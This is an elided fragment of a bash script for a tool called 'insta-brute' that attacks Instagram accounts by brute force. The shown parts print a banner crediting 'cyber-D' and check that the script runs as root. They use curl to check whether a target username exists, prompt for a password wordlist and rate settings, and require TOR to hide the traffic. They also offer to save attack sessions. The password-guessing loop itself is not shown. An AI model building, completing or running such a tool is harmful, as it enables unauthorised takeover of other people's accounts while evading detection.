...
printf "\e[1;31m (_)  _ __    ___  | |_    __ _          | |__    _ __   _   _  | |_    ___   \e[0m\n"
printf "\e[1;31m | | | '_ \  / __| | __|  / _  |  _____  |  _ \  |  __| | | | | | __|  / _ \  \e[0m\n"
printf "\e[1;36m | | | | | | \__ \ | |_  | (_| | |_____| | |_) | | |    | |_| | | |_  |  __/  \e[0m\n"
printf "\e[1;31m |_| |_| |_| |___/  \__|  \__,_|         |_.__/  |_|     \__,_|  \__|  \___|  \e[0m\n"
printf "\e[1;31m                                                                              \e[0m\n"
printf "\n"
printf "\e[1;37;1m              Team:cyber-D || Developer:mrd || insta:@cyber_mrd                \e[0m"
printf "\n"
printf "\n"
printf "\n"
...
checkroot
dependencies
read -p $'\e[1;36mAccount Username: \e[0m' user
checkaccount=$(curl -s https://www.instagram.com/$user/?__a=1 | grep -c "the page may have been removed")
if [[ "$checkaccount" == 1 ]]; then
printf "\e[1;36mInvalid Username! Try again\e[0m\n"
sleep 1
start
else
default_wl_pass="passwords.lst"
read -p $'\e[1;36mPassword WordList (Enter to default list): \e[0m' wl_pass
wl_pass="${wl_pass:-${default_wl_pass}}"
default_threads="10"
read -p $'\e[1;36mSleep After (Use < 20, Default 10): \e[0m' threads
...
if [[ "$check" -gt 0 ]]; then
printf "\e[1;31mPlease, check your TOR Connection! Just type tor or service tor start\n\e[0m"
exit 1
fi
...
if [[ -n "$threads" ]]; then
printf "\e[1;91m [*] Waiting for shutting down...\n\e[0m"
...
default_session="Y"
printf "\n\e[1;36mSave attack for user\e[0m\e[1;92m %s \e[0m" $user
read -p $'\e[1;36m? [Y/n]: \e[0m' session
...
printf "\e[1;37m attack saved... \e[0m\n"
...
printf "\e[1;37mUsername:\e[0m\e[1;77m %s\e[0m\n" $user
printf "\e[1;37mWordlist:\e[0m\e[1;77m %s (%s)\e[0m\n" $wl_pass $count_pass
printf "\e[1;31m[*] Press Ctrl + C to stop or save session\n\e[0m"
